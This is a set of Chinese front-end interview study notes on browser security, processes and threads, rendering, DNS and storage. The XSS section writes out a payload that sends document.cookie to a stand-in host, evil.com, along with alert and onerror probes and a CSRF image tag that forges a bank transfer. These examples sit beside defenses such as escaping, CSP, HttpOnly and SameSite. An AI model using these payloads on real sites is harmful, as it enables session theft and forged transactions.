> 本部分主要是要针对于浏览器相关面试题中的补充，或者是面试中应该回答的总结。
>
> [浏览器工作原理与实践 (poetries.top)](https://blog.poetries.top/browser-working-principle/)

# 浏览器安全



### 1. XSS攻击

> - [XSS网络攻击 - 原理，类型和实践_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1rg411v7B8/?spm_id_from=333.999.0.0&vd_source=7ce3f834cb0c7108338f1996b4436d48)
>
> * [前端面试题之浏览器原理篇](https://www.yuque.com/cuggz/interview/browser#afc79dc67e7ba920c635f1bbca68d162)
> * [手把手教你快速上手XSS攻击 - 掘金 (juejin.cn)](https://juejin.cn/post/7277786839841947706?searchId=202309192202275A2F4ABB969D942DEA09)
> * [前端安全系列（一）：如何防止XSS攻击？ - 美团技术团队 (meituan.com)](https://tech.meituan.com/2018/09/27/fe-security.html)

####  概念

==跨站脚本攻击XSS(Cross Site Scripting)==，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。

恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！

根据XSS攻击的方式和效果，可以分为以下三种类型：

#### 反射型XSS攻击

##### 概念/攻击流程

1. 攻击者将恶意代码作为参数附加在URL中，诱导用户点击链接；
2. 服务端接收数据之后，并不会对这些参数进行任何处理，而是拼接在HTML中将它们返回给客户端。
3. 当客户端接收到这些参数时，就会将它们当作正常的HTML或JavaScript代码来解析和执行，从而触发攻击效果。

这种攻击的特点是需要用户的主动参与，且攻击代码不会被存储在服务器上，只在当前请求中有效。

##### 实际案例1

假设有一个网站提供了一个搜索功能，用户可以输入关键字进行搜索，搜索结果会显示在页面上。如果这个网站没有对用户输入的关键字进行过滤或转义，那么攻击者就可以构造一个包含恶意代码的URL参数，URL参数为script代码。

例如：`http://www.example.com/search?keyword=<script>document.location='http://www.evil.com/?cookie='+document.cookie</script>`

当用户点击这个URL时，服务器端会将关键字参数原样拼接到响应内容(嵌入到了HTML源码)中，例如：

```html
<div>您搜索的关键字是：<script>document.location='http://www.evil.com/?cookie='+document.cookie</script></div>
```

这样，当浏览器接收到响应内容时，就会执行`<script>document.location='http://www.evil.com/?cookie='+document.cookie</script>`这段恶意代码，它会做两件事情：

1. 通过document.cookie获取用户的Cookie信息，并拼接到一个恶意网站的URL参数中。
2. 通过document.location将用户重定向到这个恶意网站。

这样，攻击者就可以在恶意网站上获取用户的Cookie信息，并利用它进行一些恶意操作，比如冒充用户身份、窃取用户数据等。同时，用户也被诱导到了一个可能含有更多恶意代码或内容的网站上，可能遭受更大的损失。

##### 实际案例2

例如，一个搜索页面的URL可能是这样的：`http://example.com/search?keyword=hello`，如果攻击者将`keyword`参数替换为`<script>alert('xss')</script>`，并将修改后的URL发送给用户，那么当用户点击该链接时，就会弹出一个对话框显示`xss`。

#### 存储型XSS攻击

##### 概念

这种攻击是通过将恶意代码提交到目标网站的数据库中，使得每次用户访问该网站时，都会加载并执行该代码。

这种攻击的特点是不需要用户的主动参与，且攻击代码会持久地保存在服务器上，影响范围更广。

##### 攻击流程

1. 攻击者将恶意代码提交到目标网站的数据库中，例如在评论中插入HTML代码。

2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。

3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。

4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

**常见场景**

用户评论、私信相关

##### 案例1

例如，一个论坛网站允许用户发表评论，并将评论内容存储在数据库中。如果攻击者在评论中插入了`<script>stealCookie()</script>`，并成功提交了评论，那么当其他用户浏览该评论时，就会执行该脚本，从而导致攻击者窃取他们的Cookie信息。

#### DOM型XSS攻击

##### 概念

DOM-based XSS：这种攻击是利用前端js代码的漏洞，使得浏览器执行恶意代码。

它的特点是恶意代码不会经过服务器端的处理，服务端只是返回HTML文件，而恶意代码嵌入是在前端页面中完成的，在浏览器端的DOM解析和执行过程中产生。

##### 工作流程

1. 攻击者构造出特殊的URL，其中包含恶意代码。

2. 用户打开带有恶意代码的URL。

3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。

4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

##### 案例

例如，一个网页可能会根据URL中的`#`后面的内容来改变页面的标题，如`http://example.com/page#title1`。如果攻击者将`#`后面的内容替换为`<img src=x onerror=alert('xss')>`，并将修改后的URL发送给用户，那么当用户访问该URL时，就会触发图片加载失败的错误事件，并执行其中的脚本。

##### 实际案例

举个例子，假设有一个网站提供了一个显示当前URL的功能，用户可以输入任意的URL参数，网站会将其显示在页面上。如果这个网站没有对用户输入的URL参数进行过滤或转义，那么攻击者就可以构造一个包含恶意代码的URL参数，例如：

`http://www.example.com/showurl?name=<script>alert('XSS')</script>`

当用户点击这个URL时，网站会将name参数原样输出到页面上（此过程并不经过服务端），例如：

`<div>您输入的URL是：<script>alert('XSS')</script></div>`

这样，当浏览器接收到页面内容时，就会执行`<script>alert('XSS')</script>`这段恶意代码，弹出一个对话框显示“XSS”。当然，这只是一个简单的例子，实际上攻击者可以利用DOM型XSS攻击做更多的事情，比如盗取用户的Cookie、重定向用户到恶意网站、执行恶意操作等。

#### 防御方法

防御反射型的XSS攻击，主要有以下几个方面：

> - 将特殊字符进行过滤或者转移，例如将< 变为 小于号`&lt;`
> - 限制可执行脚本的来源
> - 限制JS获取cookie等信息
> - 规范用户的输入

1. 对用户输入的数据进行合理的过滤或转义，避免将不可信的数据直接输出到响应内容中。例如，可以使用一些安全库或函数来对HTML特殊字符进行编码，如将<转换为&lt;，将>转换为&gt;等，这样就可以防止恶意代码被浏览器解析为HTML标签或属性。
2. 设置HTTP头中的Content-Security-Policy来限制可执行的脚本来源，只允许从可信的域名加载脚本，禁止内联脚本或动态生成的脚本。这样就可以防止恶意代码被嵌入到响应内容中或从外部加载。
3. 设置Cookie为HttpOnly来防止JavaScript访问Cookie，这样就可以防止恶意代码通过document.cookie获取用户的Cookie信息，并发送给攻击者。
4. 对用户输入的数据进行有效性验证，只接受指定长度范围、格式适当、符合预期的内容，对其他不符合预期的内容一律拒绝或忽略。这样就可以防止恶意代码通过构造异常或无效的参数来绕过过滤或转义。
5. 【**存储型额外加一条**】对服务器端存储的数据进行定期的扫描和清理，发现并删除任何可疑的恶意代码。这样就可以防止恶意代码长期存在于服务器上，并影响更多的用户。



### 2. CSRF跨域请求伪造攻击

XSRF攻击，也叫CSRF(Cross-site request forgery)攻击，是跨站请求伪造的缩写。

他的本质是利用cookie会在同源请求中携带发送给服务器的特点，以此来实现用户的冒充。

它的流程是这样的：

1. 用户登录了一个正常的网站A，网站A给用户的浏览器发送了一个cookie，用来保存用户的登录状态。
2. 用户在没有退出网站A的情况下，访问了一个恶意的网站B，网站B上有一些隐藏的链接或图片，这些链接或图片的地址其实是网站A上的一些敏感操作，比如转账、删除账号等。
3. 用户的浏览器会自动向网站A发送这些请求，同时携带着网站A的cookie，这样网站A就认为这些请求是用户本人发出的，从而执行了恶意操作。

举个例子，假设银行网站A有一个转账功能，它的URL是：

https://bank.example.com/withdraw?account=AccoutName&amount=1000&for=PayeeName

如果用户登录了银行网站A，并且没有退出，然后访问了恶意网站B，恶意网站B上有这样一个图片标签：

`<img src="https://bank.example.com/withdraw?account=Alice&amount=1000&for=Badman" />`

那么用户的浏览器就会向银行网站A发送这个转账请求，并且带上银行网站A的cookie，银行网站A就会认为用户想要转账给Badman，并执行了这个操作。

#### 攻击的防范

1. 同源检测【见面经】

2. 使用token来解决单一cookie验证的方式

3. 设置cookie属性的时候设置`samesite`为严格模式，限制cookie作为第三方使用。当你访问恶意网站时，浏览器就不会携带原的cookie发送请求，

   Cookie的`samesite`属性用来限制第三方cookie，从而减少安全风险。它可以设置三个值：Strict、Lax和None。

   - Strict：最为严格，完全禁止第三方cookie，跨站点时，任何情况下都不会发送cookie。换言之，只有当前网页的URL与请求目标一致，才会带上cookie。
   - Lax：稍稍放宽，大多数情况也是不发送第三方cookie，但是导航到目标网址的GET请求除外。这包括点击链接、预加载请求和GET表单。
   - None：没有任何限制，发送所有的cookie。不过，前提是必须同时设置Secure属性（Cookie只能通过HTTPS协议发送），否则无效。

   设置了Strict或Lax以后，基本就杜绝了CSRF攻击。当然，前提是用户浏览器支持samesite属性。

   例如，假设你是一个银行网站的用户，你在浏览器中登录了银行网站，并且在该网站上进行了一些操作，比如查询余额、转账等。这时，你的浏览器会保存一个包含你身份信息的cookie，用于在后续的请求中验证你的身份。

   然而，如果你在同一个浏览器中访问了一个恶意网站，该网站可能会利用你的cookie来伪造一些请求，向银行网站发送一些你不想做的操作，比如转账给攻击者、修改密码等。这就是CSRF攻击。

   要防范CSRF攻击，银行网站可以在设置cookie时添加samesite属性，并将其设为Strict或Lax。这样，当你访问恶意网站时，浏览器就不会携带银行网站的cookie发送请求，从而避免了CSRF攻击。

4. 在HTTP头中自定义属性并验证：这种方法是通过JavaScript在每个请求中添加一个自定义的HTTP头属性，并在服务器端验证该属性是否存在或者正确。这样可以防止攻击者利用img、script等标签发起请求，因为这些标签无法设置自定义的HTTP头属性。

   - 例如，如果银行网站提供了一个转账的链接，那么可以通过JavaScript来拦截该链接，并向服务端发送一个带有自定义HTTP头属性（如X-CSRF-Token）的XMLHttpRequest请求，并在服务端验证该属性是否与用户保存在服务器端或者cookie中的token相匹配：

   ```html
   <a href="/transfer?amount=100&to=friend" id="transfer-link">转账给朋友</a>
   <script>
       // 获取转账链接的元素
       var link = document.getElementById("transfer-link");
       // 绑定点击事件
       link.addEventListener("click", function (event) {
           // 阻止默认的跳转行为
           event.preventDefault();
           // 创建一个XMLHttpRequest对象
           var xhr = new XMLHttpRequest();
           // 设置请求的方法和地址
           xhr.open("GET", link.href);
           // 设置自定义的HTTP头属性，值为用户保存在服务器端或者cookie中的token
           xhr.setRequestHeader("X-CSRF-Token", getUserToken());
           // 设置请求的回调函数
           xhr.onload = function () {
               if (xhr.status === 200) {
                   // 如果请求成功，显示成功信息
                   alert("转账成功");
               } else {
                   // 如果请求失败，显示错误信息
                   alert("转账失败");
               }
           };
           // 发送请求
           xhr.send();
       });
   </script>
   ```

   ```javascript
   // 获取请求头中的X-CSRF-Token属性
   var token = req.headers["X-CSRF-Token"];
   // 获取用户保存在服务器端或者cookie中的token
   var userToken = getUserToken(req);
   // 判断两个token是否相等
   if (token !== userToken) {
       // 如果不相等，拒绝该请求，并返回错误信息
       res.status(403).send("Invalid Token");
       return;
   }
   // 如果相等，继续处理该请求
   ...
   ```

   但是这种方法需要浏览器支持XMLHttpRequest对象，并且对于一些不支持JavaScript或者禁用JavaScript的用户也无效。

#### 3. DDos攻击

# 进程和线程

## 1. 进程与线程的概念

进程是系统资源分配和保护的基本单位，每个进程都有自己独立的地址空间和资源。线程是CPU调度和分派的基本单位，每个线程都属于某个进程，一个进程可以有多个线程，它们共享进程的地址空间和资源。

## 2. 进程与线程的区别

- **资源分配和保护**：进程是系统资源分配和保护的基本单位，每个进程都有自己独立的地址空间和资源。线程是CPU调度和分派的基本单位，每个线程都属于某个进程，一个进程可以有多个线程，它们共享进程的地址空间和资源。
- **通信方式**：进程之间是相互隔离的，如果要进行通信，需要使用进程间通信（IPC）的方法，如管道、信号、共享内存、消息队列等。线程之间是相互可见的，如果要进行通信，可以直接访问共享内存，但是需要使用同步和互斥的手段，如锁、信号量、条件变量等，来保证数据的一致性。
- **开销和效率**：进程的创建和销毁比较耗费系统资源，进程的切换需要保存和恢复多个寄存器和内存映像。线程的创建和销毁比较轻量级，线程的切换只需要保存和恢复少数寄存器和栈指针。因此，线程比进程更适合频繁切换的场景，如用户界面、网络服务等。
- **并行和并发**：进程可以利用多核或多机实现并行执行，提高系统的吞吐量。线程可以利用多核实现并发执行，提高程序的响应速度。并行是指同时执行多个任务，而并发是指交替执行多个任务。

## 3. 进程间通讯

道是通过内核缓冲区来实现通信的。内核缓冲区是一块内存空间，可以被多个进程访问。一个进程向缓冲区写入数据，另一个进程从缓冲区读取数据。这样就实现了数据的传输。管道有两个文件描述符，一个用于写，一个用于读。管道的数据流动是单向的，要实现双向通信，需要创建两个管道。管道的读写操作都是阻塞的，也就是说，如果缓冲区为空，读操作会等待直到有数据可读；如果缓冲区满了，写操作会等待直到有空间可写。管道的特点是简单易用，但是也有一些局限性，比如只能在有亲缘关系的进程间使用（无名管道），或者需要一个文件名作为标识（有名管道）。

消息队列是通过内核维护的消息链表来实现通信的。消息队列是一种存放在内核中的数据结构，由一个标识符来唯一标识。一个进程向消息队列发送一条消息，另一个进程从消息队列接收一条消息。这样就实现了数据的传输。消息队列的特点是可以传输任意格式的数据，并且可以按照消息的类型或者优先级来选择接收哪条消息。消息队列的读写操作也都是阻塞的，但是可以设置为非阻塞模式。消息队列的优点是灵活可靠，但是也有一些缺点，比如每条消息都有额外的开销（消息类型和长度），并且占用内核空间。

信号量是通过内核维护的计数器来实现通信的。信号量是一种用于控制多个进程对共享资源访问的机制。信号量的值表示当前可用的资源数量。一个进程在访问共享资源之前，需要对信号量进行减一操作（P操作），如果信号量为零，则表示没有可用资源，进程会被阻塞；一个进程在释放共享资源之后，需要对信号量进行加一操作（V操作），如果有其他进程在等待资源，则唤醒其中一个进程。这样就实现了对共享资源的保护和同步。信号量的特点是安全有效，但是也有一些问题，比如需要避免死锁和饥饿等情况。

## 4. 死锁

死锁是指两个或多个进程或线程在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，如果没有外力干预，它们都将无法继续执行。

- 系统资源不足。当系统中的某些资源数量有限，而多个进程同时请求这些资源时，就可能发生死锁。例如，打印机、磁带机等设备是不可剥夺的资源，如果一个进程占用了这些资源，其他进程就只能等待。
- 进程推进顺序不合理。当进程在运行过程中，请求和释放资源的顺序不恰当时，也可能导致死锁。例如，两个进程分别占用了两个资源，并且都请求对方的资源，就会形成一个循环等待的状态。
- 资源分配不当。当系统采用了一些不合理的资源分配策略时，也可能引起死锁。例如，静态分配方式要求进程在运行之前就申请所有需要的资源，这样会导致资源的低效利用和长时间等待；动态分配方式要求进程在运行过程中根据需要申请和释放资源，这样会增加系统的开销和复杂度。
- 信号量使用不当。当进程间使用信号量进行同步和互斥时，如果没有遵循正确的操作规则，也可能造成死锁。例如，一个进程在执行P操作时被阻塞，而没有执行相应的V操作来释放信号量；或者一个进程在执行V操作时被抢占，而没有执行相应的P操作来获取信号量。

## 5. JavaScript是单线程的原因

单线程是指一个程序或者一个进程只有一个执行线程，也就是说同一时间只能执行一件任务，其他任务必须等待当前任务完成后才能执行。JavaScript是一门单线程的语言，它的主要用途是操作DOM（文档对象模型），实现用户和网页的交互。如果JavaScript是多线程的，那么可能会出现同时修改同一个DOM元素的情况，导致页面混乱或者崩溃。因此，为了保证页面的稳定性和一致性，JavaScript被设计成单线程的。

总之，JavaScript是单线程的，但是可以通过事件循环和任务队列来实现异步操作。这样既可以避免多线程带来的复杂性和风险，又可以提高用户体验和性能。

## 6. 浏览器的进程有哪些？

- 浏览器主进程（Browser Process）：这是浏览器的核心进程，负责协调和管理其他进程，以及处理用户界面、标签页、地址栏、书签栏等浏览器功能。浏览器主进程只有一个，它是浏览器的入口和出口。
- 渲染进程（Render Process）：这是浏览器用来渲染网页的进程，负责执行JavaScript、计算CSS样式、构建DOM树、布局和绘制等网页渲染任务。渲染进程可以有多个，每个标签页或者框架都可以对应一个渲染进程，它们之间是相互隔离的，以保证安全和稳定。
- 网络进程（Network Process）：这是浏览器用来处理网络请求的进程，负责与服务器进行通信，下载网页资源，支持HTTP协议和缓存等网络功能。网络进程可以有多个，但是一般只有一个，它为所有渲染进程提供服务。
- GPU进程（GPU Process）：这是浏览器用来执行GPU相关任务的进程，负责处理3D绘制、视频解码、页面合成等GPU加速的功能。GPU进程可以有多个，但是一般只有一个，它为所有渲染进程提供服务。
- 插件进程（Plugin Process）：这是浏览器用来运行插件的进程，负责加载和执行插件代码，如Flash、PDF等。插件进程可以有多个，每个插件都可以对应一个插件进程，它们与渲染进程通过IPC（Inter-Process Communication）进行通信。

## 7. 渲染进程中有哪些线程

- GUI渲染线程：负责渲染页面，解析HTML和CSS，构建DOM树和CSSOM树，生成渲染树，以及绘制页面。重绘和重排也是在该线程执行。该线程和主线程是互斥的，当主线程执行时，GUI渲染线程会被挂起，反之亦然。
- 计时器线程：负责处理setInterval和setTimeout的定时器任务。因为主线程是单线程的，如果处于阻塞状态，那么计时器就会不准确，所以需要单独的线程来负责计时器工作。当计时器到期时，该线程会把对应的回调函数加入到任务队列中，等待主线程空闲时执行。
- 异步HTTP请求线程：负责处理XMLHttpRequest的异步请求任务。当请求完成后，该线程会把回调函数加入到事件队列中，等待主线程空闲时执行。
- 事件触发线程：负责控制事件循环，比如主线程遇到计时器、AJAX异步请求等，就会将对应任务添加到事件触发线程中，在对应事件符合触发条件时，就把事件添加到待处理队列的队尾，等待主线程处理。

总之，打开一个页面，除了主线程用来执行JavaScript外，还有GUI渲染线程、计时器线程、异步HTTP请求线程、事件触发线程等辅助线程，它们各司其职，协同工作，共同完成页面的加载、渲染和交互等功能。

## 8. ※如何在一个页面执行多个线程

### 浏览器的多线程

1. 浏览器在一个页面中本身就存在多个线程，介绍相关内容
2. 浏览器的线程我们是不能使用js来控制的，它们是由浏览器本身管理的。

### JavaScript多线程

JavaScript在一个页面中可以通过Web Workers、Service Workers等方式创建一些后台线程，比如来执行一些耗时的任务，处理网络请求，缓存资源，推送通知等功能，他们不会影响主线程的运行。但这些线程并不是浏览器本身就开启的，而是由JavaScript代码创建的。这些线程也不能访问DOM，也不能直接和其他标签页通信，需要通过一些特定的API来实现。

**注：**他们都属于==宏任务==的一部分。

**了解**

- Web Workers API用来执行一些耗时的计算任务，比如图像处理，数据分析，机器学习等。这些任务如果在主线程上运行，可能会导致页面卡顿或者无响应。通过将这些任务放在后台线程上运行，可以提高页面的性能和用户体验。
- Service Workers API用来处理网络请求，缓存资源，推送通知等功能。这些功能可以让页面在离线状态下也能正常工作，或者在后台接收消息和更新。通过使用Service Workers线程，可以提高页面的可靠性和实时性。
- SharedArrayBuffer和Atomics对象用来实现内存共享和原子操作，让不同的线程可以读写同一块内存数据。这样可以实现更高效的数据交换和同步，但也需要注意避免数据竞争和死锁等问题。这些对象可以用来实现一些高性能的并行计算，比如WebAssembly，WebGL等。

## 9. 浏览器渲染页面的时候哪些进程或者线程在工作？

浏览器主进程（Browser Process）：负责协调、主控，以及负责各个页面的管理，创建和销毁其他进程。

渲染进程（Renderer Process）：负责一个 Tab 内的语言解析和页面渲染。每个 Tab 页面都有一个渲染进程，互不影响。渲染进程内部又有多个线程，如：

- GUI 渲染线程：负责解析 HTML 和 CSS，构建 DOM 树和 CSSOM 树，合并成渲染树，计算布局和绘制页面。该线程与 JS 引擎线程是互斥的，当 JS 引擎执行时，GUI 线程会被挂起，反之亦然。
  JS 引擎线程：负责处理 Javascript 脚本，执行代码。该线程与 GUI 线程互斥，为了防止 JS 脚本修改 DOM 而导致渲染结果不一致，JS 执行会阻塞页面渲染。
- 事件触发线程：负责将准备好的事件交给 JS 引擎线程执行。例如，当一个点击事件发生时，该线程会将点击事件的回调函数添加到任务队列中，等待 JS 引擎线程空闲时执行。
- 定时器触发线程：负责处理异步的定时器函数，如 setTimeout 和 setInterval。该线程会在指定时间后将定时器的回调函数添加到任务队列中，等待 JS 引擎线程空闲时执行。
- 异步 HTTP 请求线程：负责处理异步的网络请求，如 XMLHttpRequest 或 fetch。该线程会在网络请求完成后将回调函数添加到任务队列中，等待 JS 引擎线程空闲时执行。

GPU 进程：负责处理 GPU 相关的操作，如 3D 绘制或页面合成。该进程会接收来自渲染进程的层和纹理信息，然后将各层合成为最终的图像，并显示到屏幕上。

网络进程（Network Process）：负责页面的网络资源加载，如处理网络请求、DNS 查询、TCP 握手、TLS 协商等。该进程为每个渲染进程提供网络服务，并且可以被多个渲染进程共享。



# 浏览器渲染原理

## 1. 浏览器的渲染流程

### 渲染过程

> [渲染树的形成原理你真的很懂吗? - 掘金 (juejin.cn)](https://juejin.cn/post/6844903983052488717)
>
> [Dom树 CSS树 渲染树(render树) 规则、原理 - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1715276)
>
> [浏览器渲染页面的流程\_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV18f4y1H7Zu/?vd_source=7ce3f834cb0c7108338f1996b4436d48)

浏览器渲染页面的流程大致如下：

- 浏览器从网络层**获取请求文档**的内容，如HTML文件。

- 【DOM】浏览器解析HTML文件，构建DOM树，即将HTML文档中的所有内容转换为节点，并形成层级关系。

  CSS一般在link标签中，所以在解析HTML文件的时候，会请求对应的CSS文件。

- 【CSSOM】浏览器解析CSS文件，构建CSSOM树，即将CSS文档中的所有样式转换为节点，并形成层级关系。CSSOM树会继承和覆盖父节点的样式，形成最终的样式规则。

- 【渲染树】浏览器将DOM树和CSSOM树合并为渲染树（Render Tree），即将每个DOM节点和对应的CSS样式关联起来，形成一个包含==可见元素==和样式信息的树结构。

  - 不会被呈现出来的，就不会在渲染树上显示。例如标签：meta，link，设置display:none的元素


  - 渲染树的合并，不是等到DOM树和CSSOM树构建完成才进行，而是一边构建两个树，一边合并为渲染树。

- 【布局阶段】浏览器根据渲染树计算每个**可见元素的布局，**即确定每个元素的位置和大小，以及其他几何属性。

- 【绘制阶段】浏览器根据布局信息绘制每个可见元素，即将像素渲染到屏幕上。这一步可能涉及到分层、合成和光栅化等过程，以提高渲染效率和性能。


**注意**

- 浏览器在渲染过程中(这里的渲染指的是构建渲染树的过程，而不是布局和布局绘制)，可能会遇到JavaScript文件或代码，这时会暂停渲染，交给JavaScript引擎执行，因为JavaScript可能会修改DOM或CSSOM，影响渲染结果。执行完毕后，浏览器会恢复渲染。

- 浏览器在渲染完成后，如果遇到DOM或CSSOM的变化，可能会触发重绘（repaint）或重排（reflow），即重新计算布局或绘制元素。重排一定会引起重绘，而重绘不一定会引起重排。重排和重绘都会影响渲染性能，应尽量避免或减少。

渲染树是在DOM树和CSSOM树构建的过程中同时进行的，不是等到DOM树和CSSOM树都构建完毕才开始。浏览器会尽可能地提前构建渲染树，以便更快地显示页面内容。

### DOM解析中遇到标签怎么办？

> <font color='red'>什么时候停止解析？</font>
>
> 遇到JS文件。
>
> <font color='red'>什么时候停止渲染？</font>
>
> 渲染树取决于DOM的解析和CSS的解析，因此当影响到DOM解析和CSS解析的时候，就会影响渲染。
>
> - 渲染是DOM+CSSOM的结果，因此遇到加载CSS文件的时候，不会继续渲染，但是会进行解析；
>
> - 同理JS也会影响渲染；
>   - DOM的解析要等待JS的执行完毕，因为JS要对DOM进行操作；
>   - 而JS的执行要等待CSSOM的构建完成，因为JS要对CSS进行操作。
>   - 进一步的说，CSS文件也会影响渲染，
>
>
> 注意，因为遇到JS之后，DOM不解析同样也不会访问到后续的CSS文件，因此可以说JS会阻塞CSS

#### 1 遇到link标签，请求文件（CSS文件）等。

<font color='red'>CSS 文件的加载不会阻塞 DOM 的解析（DOM的构建）</font>，但会 DOM 的渲染，也就是说，浏览器会先构建 DOM 树，然后等待 CSS 文件加载完毕并构建 CSSOM 树，再合并生成渲染树并渲染页面。

**注**

==DOM的渲染==不仅包括了DOM树的构建，还包括了渲染树的构建和绘制。DOM的解析和DOM的渲染不是一个意思，DOM的解析只是DOM的渲染过程中的第一步，而DOM的渲染还涉及到CSSOM树、渲染树、布局和绘制等步骤。

#### 2 遇到JS文件

> 本质：JS会影响DOM树和CSSOM的构建，因为JS可能会操作DOM元素或者CSS的样式；
>
> 如果 JS 文件有 ==async== 或 ==defer== 属性，那么浏览器会异步加载和执行 JS 文件，不会阻塞 DOM 的解析和渲染。只有没有这些属性的 JS 文件才会同步加载和执行，阻塞 DOM 的解析和渲染。

DOM 树构建时当遇到 JavaScript 脚本，就要暂停 DOM 解析，JS脚本的加载和运行都会阻塞DOM的解析，因为JS会操作DOM；

当JS脚本加载完毕后，还要判断 CSSOM 是否解析完成，因为在 JavaScript 可能会操作 CSSOM节点（操作CSS样式），CSSOM 节点确认解析完成，执行 JavaScript 再次回到 DOM 树创建。（**所以这里也可以所CSS解析间接影响DOM树创建**）

#### 3 遇到img标签等

> 不会阻塞html的解析

浏览器继续解析HTML文件，构建DOM树。如果遇到`<img>`或其他媒体资源，请求对应的文件，但不暂停DOM树的构建。继续构建渲染树，并在合适的时机显示图片或媒体资源。

#### 4 最后

浏览器完成HTML文件的解析，完成DOM树的构建。此时所有的CSS文件和样式也加载完成，完成CSSOM树的构建。此时渲染树也完整了，包含了所有可见元素和样式信息。



## 2. 浏览器的渲染优化

### 2.1 JS优化

### 2.2 CSS优化

### 3. 

## 5. CSS如何阻塞文档的解析

- CSS会阻塞渲染树的生成。

  渲染树是用于绘制页面的树，它需要DOM树和CSSOM树的合并。DOM树是HTML文档的结构，CSSOM树是CSS样式表的结构。浏览器在生成渲染树时，需要等待CSSOM树的完成，因为CSSOM树会影响DOM树中元素的可见性和样式。因此，如果CSS文件加载缓慢或阻塞，会导致页面渲染延迟或白屏现象。

- CSS会阻塞JavaScript脚本的执行。

  JavaScript脚本是用于定义和控制网页逻辑和交互的语言。浏览器在执行JavaScript脚本时，需要等待CSSOM树的完成，因为JavaScript脚本可能会访问或修改CSSOM树中的节点。因此，如果CSS文件加载缓慢或阻塞，会导致JavaScript脚本执行延迟或错误。

## 6. 浏览器上输入了URL发生了什么？

当你在浏览器中输入url后，会发生以下几个步骤：

- **URL解析**：浏览器会判断你输入的是一个合法的url还是一个待搜索的关键词，并根据你输入的内容进行自动完成、字符编码等操作。浏览器还会进行一些安全检查、访问限制等操作，并检查缓存中是否有该url对应的资源。
- **DNS查询**：浏览器会根据url中的域名，通过一系列的递归和迭代查询，从浏览器缓存、系统缓存、路由器缓存、ISP DNS缓存和根域名服务器等不同层级的DNS服务器，获取该域名对应的IP地址。
- **TCP连接**：浏览器会根据IP地址和端口号，向服务器发起一个TCP连接请求，通过三次握手协议，建立一个可靠的双向通信信道。如果是HTTPS请求，还需要进行SSL握手，建立一个安全的加密通信信道。
- **HTTP请求**：浏览器会构造一个HTTP请求报文，包含请求方法、目标地址、协议版本、请求头和请求体等信息，并通过TCP连接发送给服务器。
- **HTTP响应**：服务器收到HTTP请求后，会进行一些处理，如验证、重定向、URL重写等，并根据请求的资源类型，调用相应的程序或脚本来生成响应内容。然后，服务器会构造一个HTTP响应报文，包含状态码、响应头和响应体等信息，并通过TCP连接发送给浏览器。
- **渲染页面**：浏览器收到HTTP响应后，会对响应报文进行解析，根据状态码做不同的处理，如重定向、缓存等。然后，浏览器会根据响应内容的MIME类型，进行不同的解析方式，如HTML、Image等。最后，浏览器会通过一系列的子阶段，如构建DOM树、样式计算、布局阶段、分层、栅格化和显示等，将响应内容渲染成可视化的页面。

## 7. DNS解析过程

> [DNS域名解析过程_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1uL4y1B7aE/?vd_source=7ce3f834cb0c7108338f1996b4436d48)

DNS解析的过程是指将域名转换为IP地址的过程，以便用户可以通过域名访问互联网上的资源。DNS解析的过程大致如下：

- 用户在浏览器中输入一个域名，如www.baidu.com，浏览器会先检查自己的缓存中是否有这个域名对应的IP地址，如果有，就直接使用该IP地址访问网站。
- 如果浏览器缓存中没有，浏览器会再检查操作系统的缓存中是否有这个域名对应的IP地址，如果有，也会直接使用该IP地址访问网站。
- 如果操作系统缓存中也没有，浏览器会向本地DNS服务器（Local DNS）发送一个DNS查询请求，本地DNS服务器是用户所在网络运营商提供的一个DNS服务，它会在自己的缓存中查找这个域名对应的IP地址，如果找到，就返回给浏览器。
- 如果本地DNS服务器缓存中也没有，本地DNS服务器就会向根DNS服务器（Root DNS）发送一个DNS查询请求，根DNS服务器是全球最高级别的DNS服务器，它们负责管理所有顶级域名（如.com、.cn、.org等），根DNS服务器会根据请求的域名返回一个对应的顶级域名服务器（TLD Server）的地址给本地DNS服务器。
- 本地DNS服务器再向根DNS服务器返回的顶级域名服务器发送一个DNS查询请求，顶级域名服务器负责管理某个顶级域名下的所有二级域名（如baidu.com、taobao.com等），顶级域名服务器会根据请求的域名返回一个对应的权威域名服务器（Authoritative Server）的地址给本地DNS服务器。
- 本地DNS服务器再向顶级域名服务器返回的权威域名服务器发送一个DNS查询请求，权威域名服务器是由域名注册商提供的一个DNS服务，它负责管理某个二级域名下的所有子域名（如www.baidu.com、mail.baidu.com等），权威域名服务器会根据请求的域名返回一个对应的IP地址给本地DNS服务器。
- 本地DNS服务器将最终得到的IP地址返回给浏览器，并将其缓存一段时间以备后用。浏览器也会将这个IP地址缓存一段时间，并使用它来访问网站。

以上是我对DNS解析的过程的回答，希望对你有所帮助。如果你想了解更多相关信息，你可以参考以下网页：

- [细说DNS域名解析的原理和过程 - 帝恩思-DNS.COM](https://www.dns.com/supports/article/705.html)
- [简述DNS解析过程_简述dns解析的过程-CSDN博客](https://blog.csdn.net/borderhz/article/details/117301624)
- [wireshark dns域名解析抓包实验分析 - 不忘初心dbsdxq - 博客园](https://www.cnblogs.com/mggahui/p/13899888.html)

## 8. 浏览器的性能优化

见面经，主要是从渲染的角度上来看

下面的其他的相关内容

[day12 简述浏览器的渲染过程及性能优化 - 掘金 (juejin.cn)](https://juejin.cn/post/7064518416836591629?from=search-suggest)

# 浏览器的本地存储

## 1. 浏览器本地存储方式与场景

> [浏览器本地存储的四种方式介绍及区别 - 掘金 (juejin.cn)](https://juejin.cn/post/7158414568950071309?searchId=202308181517379DCD2401E2ED75A6E834#heading-2)

### 总结掌握

> 掌握的内容：
>
> - 概念
> - 大小
